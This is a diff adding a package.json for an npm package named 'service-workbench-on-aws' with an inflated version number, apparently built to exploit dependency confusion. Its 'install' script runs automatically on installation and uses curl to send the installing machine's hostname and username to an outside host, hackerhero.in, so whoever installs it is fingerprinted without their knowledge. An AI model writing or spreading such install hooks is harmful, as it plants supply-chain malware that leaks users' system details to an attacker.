@@ -1,0 +1,14 @@
+{
+  "name": "service-workbench-on-aws",
+  "version": "200.0.16",
+  "description": "service-workbench-on-aws: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+   "install": "curl -sI http://hackerhero.in/jugnu/%computername%`hostname`/%username%-`whoami`/p-service-workbench-on-aws"
+  },
+  "author": "another noob developer",
+  "license": "ISC",
+  "dependencies": {
+    "wf-translate-text": "^0.0.1"
+  }
+}
